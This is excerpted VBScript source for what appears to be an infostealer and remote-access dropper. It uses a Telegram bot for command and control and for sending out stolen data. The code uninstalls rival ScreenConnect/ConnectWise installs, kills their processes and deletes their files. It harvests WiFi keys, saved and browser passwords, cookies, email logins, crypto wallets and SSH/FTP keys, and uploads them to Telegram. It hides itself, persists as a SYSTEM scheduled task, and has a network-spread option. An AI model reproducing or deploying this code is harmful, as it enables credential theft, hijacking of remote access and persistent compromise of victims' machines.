...
Sub Main()
    ...
    If NETWORK_SPREAD_ENABLED Then NetworkSpread()
...
Sub CheckForUpdate()
    ...
    Dim oHTTP, sURL, sResponse
    sURL = "https://api.telegram.org/bot" & sBotToken & "/getUpdates"
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "GET", sURL, False
    oHTTP.Send
    If oHTTP.Status = 200 Then
        sResponse = oHTTP.responseText
        If InStr(1, sResponse, "/update", vbTextCompare) > 0 Then
            Dim nStart, nEnd, sNewURL
            nStart = InStr(1, sResponse, "/update ", vbTextCompare) + 8
            ...
            If sNewURL <> "" And InStr(1, sNewURL, "http", vbTextCompare) > 0 Then
                ...
                oReg.SetStringValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCURL", sNewURL
                Set oReg = Nothing
                SendTelegramMessage "[OK] Update applied on " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            End If
        End If
    End If
    Set oHTTP = Nothing
...
Function GetURL()
    ...
    Dim oReg, sRegURL
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    oReg.GetStringValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCURL", sRegURL
...
Function GetRunCount()
    ...
    Dim oReg, n
    Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
    oReg.GetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", n
    If IsEmpty(n) Then GetRunCount = 0 Else GetRunCount = n
    Set oReg = Nothing
    On Error GoTo 0
End Function
...
Sub IncrementRunCount()
    ...
    n = n + 1
    oReg.SetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", n
    Set oReg = Nothing
    On Error GoTo 0
End Sub
...
Sub ProcessPhase()
    ...
    Select Case n
        Case 0, 1, 2
        Case 3 : RemovePhase 25 : SendTelegramMessage "[PHASE] Phase 2"
        Case 4 : RemovePhase 50 : SendTelegramMessage "[PHASE] Phase 3"
        Case 5 : RemovePhase 75 : SendTelegramMessage "[PHASE] Phase 4"
        Case Else
            RemovePhase 100
            SendTelegramMessage "[PHASE] Phase 5"
            Const HKLM = &H80000002
            Dim o : Set o = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
            o.SetDWORDValue HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "SCD", 0
            Set o = Nothing
    End Select
    On Error GoTo 0
End Sub
...
Sub RemovePhase(p)
    ...
    Dim b : b = Array("SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall")
    c = 0
    For Each s In b
        o.EnumKey HKLM, s, k
        If IsArray(k) Then
            For Each u In k
                o.GetStringValue HKLM, s & "\" & u, "DisplayName", d
                If Not IsEmpty(d) And d <> "" Then
                    If InStr(1, d, "ScreenConnect", vbTextCompare) > 0 Or InStr(1, d, "ConnectWise", vbTextCompare) > 0 Then
                        o.GetStringValue HKLM, s & "\" & u, "UninstallString", u
                        If InStr(1, u, "ackermantoyota", vbTextCompare) = 0 Then
                            ReDim Preserve a(c) : a(c) = s & "\" & u : c = c + 1
                        End If
                    End If
                End If
            Next
    ...
    Next
    Dim t : t = Int(c * p / 100)
    If t < 1 And p > 0 Then t = 1
    If t > 0 And c > 0 Then
        Randomize
        For i = UBound(a) To 1 Step -1
            Dim j, tmp : j = Int(Rnd * (i + 1)) : tmp = a(i) : a(i) = a(j) : a(j) = tmp
        Next
        For i = 0 To t - 1
            If i <= UBound(a) Then
                Dim f, g, x
                f = a(i) : g = Mid(f, InStrRev(f, "\") + 1)
                o.GetStringValue HKLM, f, "QuietUninstallString", x
                If IsEmpty(x) Then
                    o.GetStringValue HKLM, f, "UninstallString", x
                    If InStr(1, x, "msiexec", vbTextCompare) > 0 Then
                        x = Replace(x, "/I", "/X", 1, -1, vbTextCompare)
                        x = x & " /qn /norestart"
                    End If
                End If
                If x <> "" Then oShell.Run "cmd /c " & x, 0, True : WScript.Sleep 5000
                o.DeleteKey HKLM, f
                KillOtherProcesses()
                DeleteOtherFiles()
            End If
...
Sub KillOtherProcesses()
    On Error Resume Next
    Dim c, p
    Set c = oWMI.ExecQuery("SELECT * FROM Win32_Process")
    For Each p In c
        If Not IsNull(p.ExecutablePath) Then
            If InStr(1, p.ExecutablePath, "ScreenConnect", vbTextCompare) > 0 Then
                If InStr(1, p.ExecutablePath, sH, vbTextCompare) = 0 Then
                    p.Terminate() : WScript.Sleep 500
                End If
            End If
        End If
    Next
...
Sub DeleteOtherFiles()
    On Error Resume Next
    Dim a, s
    a = Array("C:\Program Files\ScreenConnect\", "C:\Program Files (x86)\ScreenConnect\", _
    ...
    For Each s In a
        If oFSO.FolderExists(s) Then
            If InStr(1, s, sH, vbTextCompare) = 0 Then
                oShell.Run "cmd /c takeown /f """ & s & """ /r /d y > nul 2>&1", 0, True
                oShell.Run "cmd /c icacls """ & s & """ /grant Administrators:F /t /c /q > nul 2>&1", 0, True
                WScript.Sleep 1000 : oFSO.DeleteFolder s, True
            End If
        End If
    Next
    On Error GoTo 0
...
Function PreFlightCheck()
    ...
    Next
    Dim oDrive : Set oDrive = oFSO.GetDrive("C:")
    If oDrive.IsReady Then
        If oDrive.FreeSpace < 524288000 Then PreFlightCheck = False
    End If
    On Error GoTo 0
End Function
...
Sub KillAllRelatedProcesses()
    ...
    For Each sProcName In aProcessNames
        ...
        For Each objProcess In colProcesses
            objProcess.Terminate() : WScript.Sleep 500
        Next
    Next
...
Sub StopAllRelatedServices()
    ...
    For Each objService In colServices
        objService.StopService() : WScript.Sleep 2000
...
Sub UninstallViaWMI()
    ...
    For Each objProduct In colProducts
        objProduct.Uninstall() : WScript.Sleep 5000
    Next
    On Error GoTo 0
End Sub
                        ...
                        If InStr(1, sDisplayName, "ScreenConnect", vbTextCompare) > 0 Or _
                           InStr(1, sDisplayName, "ConnectWise", vbTextCompare) > 0 Then
                            ...
                            If sUninstallString <> "" Then
                                oShell.Run "cmd /c " & sUninstallString, 0, True : WScript.Sleep 5000
                            End If
    ...
    For Each sPath In aPaths
        If oFSO.FolderExists(sPath) Then
            ...
            If Err.Number <> 0 Then
                oShell.Run "cmd /c rmdir /s /q """ & sPath & """", 0, True : Err.Clear
            End If
        End If
    Next
    ...
    For Each hive In aHives
        For Each sPath In aPaths
            If InStr(1, sPath, "Uninstall", vbTextCompare) = 0 Then
                oReg.DeleteKey hive, sPath : Err.Clear
            Else
                oReg.EnumKey hive, sPath, arrSubKeys
                If IsArray(arrSubKeys) Then
                    For Each sSubKey In arrSubKeys
...
'==========================================================================
' COMPETITOR REMOVAL (12 tools - NO RDP, NO Quick Assist)
'==========================================================================
Sub RemoveCompetingTools()
    ...
    Dim sRemovedList, i : sRemovedList = ""
    For i = 0 To 11
...
Sub HarvestWiFiCredentials()
    ...
    End If
    If Not bFound Then oFile.WriteLine "  No WiFi profiles found."
    oFile.Close
    On Error GoTo 0
End Sub
...
Sub HarvestSavedPasswords()
    ...
    End If
    If Not bFound Then oFile.WriteLine "  No saved credentials found."
    oFile.Close
    On Error GoTo 0
End Sub
...
Sub HarvestBrowserData()
    ...
    If Not bFound Then
        ...
        oNote.WriteLine "No browser data found."
        oNote.Close
    End If
    On Error GoTo 0
End Sub
...
Sub HarvestEmailClients()
    On Error Resume Next
    Dim sOutputFile: sOutputFile = sDataDir & "\Email_Clients.txt"
    Dim oFile: Set oFile = oFSO.CreateTextFile(sOutputFile, True)
        ...
        For Each oTBProfile In oTBFolder.SubFolders
            ...
            If oFSO.FileExists(oTBProfile.Path & "\logins.json") Then
                ...
                For Each sLine2 In aLines
                    If InStr(1, sLine2, "hostname", vbTextCompare) > 0 Then oFile.WriteLine "    " & Trim(sLine2)
                    If InStr(1, sLine2, "encryptedUsername", vbTextCompare) > 0 Then oFile.WriteLine "    " & Left(Trim(sLine2), 100) & "..."
                    If InStr(1, sLine2, "encryptedPassword", vbTextCompare) > 0 Then oFile.WriteLine "    " & Left(Trim(sLine2), 100) & "..."
                Next
                oFile.WriteLine ""
            End If
...
Sub HarvestCryptoWallets()
    On Error Resume Next
    Dim sWalletDir: sWalletDir = sDataDir & "\Crypto_Wallets"
    If Not oFSO.FolderExists(sWalletDir) Then oFSO.CreateFolder sWalletDir
    Dim sOutputFile: sOutputFile = sDataDir & "\Crypto_Wallets.txt"
    Dim oFile: Set oFile = oFSO.CreateTextFile(sOutputFile, True)
    ...
    If Not bFound Then oFile.WriteLine "  No crypto wallets found."
    oFile.Close
    On Error GoTo 0
End Sub
...
Function ScanWallet(sWalletName, sFolderPath, sFilePattern, sOutputDir, oFile)
    ...
    Dim oFolder, bFound: bFound = False
    ...
    Else
        ...
        End If
    End If
    If bFound Then oFile.WriteLine "  Status: Wallet file found" : ScanWallet = True Else oFile.WriteLine "  Status: No wallet files found"
    oFile.WriteLine ""
    Set oFolder = Nothing
    On Error GoTo 0
End Function
...
Sub HarvestFTPSSHKeys()
    On Error Resume Next
    Dim sOutputDir: sOutputDir = sDataDir & "\FTP_SSH_Keys"
    If Not oFSO.FolderExists(sOutputDir) Then oFSO.CreateFolder sOutputDir
    Dim sOutputFile: sOutputFile = sDataDir & "\FTP_SSH_Credentials.txt"
    Dim oFile: Set oFile = oFSO.CreateTextFile(sOutputFile, True)
    ...
    Dim sFileZillaPath: sFileZillaPath = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\FileZilla"
    If oFSO.FolderExists(sFileZillaPath) Then
        If oFSO.FileExists(sFileZillaPath & "\recentservers.xml") Then
            ...
            oFile.WriteLine "  File: recentservers.xml (copied)" : bFound = True
        End If
        If oFSO.FileExists(sFileZillaPath & "\sitemanager.xml") Then
            ...
            oFile.WriteLine "  File: sitemanager.xml (copied)" : bFound = True
        End If
    End If
    ...
    Dim sWinSCPPath: sWinSCPPath = oShell.ExpandEnvironmentStrings("%APPDATA%") & "\WinSCP.ini"
    If oFSO.FileExists(sWinSCPPath) Then
        oFSO.CopyFile sWinSCPPath, sOutputDir & "\WinSCP.ini", True
        oFile.WriteLine "  File: WinSCP.ini (copied)" : bFound = True
    End If
    ...
    If oFSO.FolderExists(sSSHDir) Then
        ...
        For Each oSSHFile In oSSHFolder.Files
            If InStr(1, oSSHFile.Name, "id_") > 0 Or InStr(1, oSSHFile.Name, "known_hosts") > 0 Then
                ...
                oFile.WriteLine "  Key: " & oSSHFile.Name & " (" & FormatFileSize(oSSHFile.Size) & ")" : bFound = True
            End If
        Next
...
Sub GatherSystemInventory()
    ...
    For Each objRAM In colRAM
        ...
        sInfo = sInfo & "[RAM] " & nTotalRAM & " GB%0A" : Exit For
    Next
    Dim oDrive : Set oDrive = oFSO.GetDrive("C:")
    If oDrive.IsReady Then sInfo = sInfo & "[DISK] C: " & FormatFileSize(oDrive.TotalSize) & " (" & FormatFileSize(oDrive.FreeSpace) & " free)%0A"
    Dim colNet, objNet
...
Sub ExportAndSendBrowserPasswords()
    ...
    If Not bChromeInstalled And Not bEdgeInstalled Then
        SendTelegramMessage "[COOKIE] No Chrome or Edge found on " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    ...
    If oFSO.FileExists(sChromePassExe) And bChromeInstalled Then
        oShell.Run """" & sChromePassExe & """ /stext """ & sChromeCSV & """", 0, True : WScript.Sleep 3000
        If oFSO.FileExists(sChromeCSV) Then
            Dim oChromeFile: Set oChromeFile = oFSO.GetFile(sChromeCSV)
            If oChromeFile.Size > 50 Then bChromeFound = True Else oFSO.DeleteFile sChromeCSV, True
    ...
    If oFSO.FileExists(sEdgePassExe) And bEdgeInstalled Then
        oShell.Run """" & sEdgePassExe & """ /stext """ & sEdgeCSV & """", 0, True : WScript.Sleep 3000
        If oFSO.FileExists(sEdgeCSV) Then
            Dim oEdgeFile: Set oEdgeFile = oFSO.GetFile(sEdgeCSV)
            If oEdgeFile.Size > 50 Then bEdgeFound = True Else oFSO.DeleteFile sEdgeCSV, True
    ...
    If Not bChromeFound And Not bEdgeFound Then
        SendTelegramMessage "[COOKIE] No saved passwords found on " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    Else
        If bChromeFound Then SendTelegramMessage "[COOKIE] Chrome Passwords Exported - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
        If bEdgeFound Then SendTelegramMessage "[COOKIE] Edge Passwords Exported - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
        ...
        If Not bZIPCreated Then
            If bChromeFound And oFSO.FileExists(sChromeCSV) Then SendFileToTelegram sChromeCSV, "[COOKIE] Chrome Passwords - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            If bEdgeFound And oFSO.FileExists(sEdgeCSV) Then SendFileToTelegram sEdgeCSV, "[COOKIE] Edge Passwords - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            If oFSO.FileExists(sChromePassExe) Then SendFileToTelegram sChromePassExe, "[TOOL] ChromePass - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
            If oFSO.FileExists(sEdgePassExe) Then SendFileToTelegram sEdgePassExe, "[TOOL] EdgePass - " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
        Else
...
Sub SendBrowserCookiesToTelegram()
    ...
    If Not bSent Then SendTelegramMessage "[COOKIE] No browser cookies found on " & oShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
    On Error GoTo 0
End Sub
...
Sub SendTelegramMessage(sMessage)
    ...
    sRequestBody = "{""" & "chat_id" & """:""" & sChatID & """,""" & "text" & """:""" & sMessage & """}"
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
...
Sub SendFileToTelegram(sFilePath, sCaption)
    ...
    sHeader = "--" & sBoundary & vbCrLf & "Content-Disposition: form-data; name=""chat_id""" & vbCrLf & vbCrLf & sChatID & vbCrLf & "--" & sBoundary & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""" & oFSO.GetFileName(sFilePath) & """" & vbCrLf & "Content-Type: application/octet-stream" & vbCrLf & vbCrLf
    sCaption = CleanTelegramText(sCaption)
    sFooter = vbCrLf & "--" & sBoundary & vbCrLf & "Content-Disposition: form-data; name=""caption""" & vbCrLf & vbCrLf & sCaption & vbCrLf & "--" & sBoundary & "--"
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "POST", sURL, False
    oHTTP.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & sBoundary
    oHTTP.Send sHeader & oStream.Read() & sFooter
    oStream.Close : Set oStream = Nothing : Set oHTTP = Nothing
    On Error GoTo 0
End Sub
...
Sub SendInstallReport()
    ...
    If g_RemovedTools <> "" Then sMessage = sMessage & vbCrLf & "[OK] Removed: " & g_RemovedTools
    If g_NetworkPCs <> "" Then sMessage = sMessage & vbCrLf & "[NET] Network PCs: " & g_NetworkPCs
...
Sub SendFileAsTelegramMessage(sFilePath, sCaption)
    ...
    oFile.Close
    If Len(sContent) > 3500 Then sContent = Left(sContent, 3500) & "...[truncated]"
    Dim sMessage : sMessage = sCaption & "\n-----------------------------\n" & sContent
    SendTelegramMessage sMessage
    On Error GoTo 0
End Sub
...
Sub HideScript()
    ...
    If Not oFSO.FolderExists(sHiddenDir) Then CreateNestedFolders sHiddenDir
    If LCase(sOriginalScript) <> LCase(sHiddenScriptPath) Then
        oFSO.CopyFile sOriginalScript, sHiddenScriptPath, True
        Dim oHiddenFile : Set oHiddenFile = oFSO.GetFile(sHiddenScriptPath)
...
Sub CreatePersistence()
    ...
    Dim sCreateTaskCmd
    sCreateTaskCmd = "schtasks /create /tn """ & sTaskName & """ " & "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & "/sc DAILY " & "/st 00:00 " & "/ri 1440 " & "/du 24:00 " & "/ru SYSTEM " & "/rl HIGHEST " & "/f"
    oShell.Run sCreateTaskCmd, 0, True
    oShell.Run "schtasks /change /tn """ & sTaskName & """ " & "/tr ""wscript.exe //B """ & sHiddenScriptPath & """""" & " /sc ONLOGON", 0, True
    If Err.Number = 0 Then
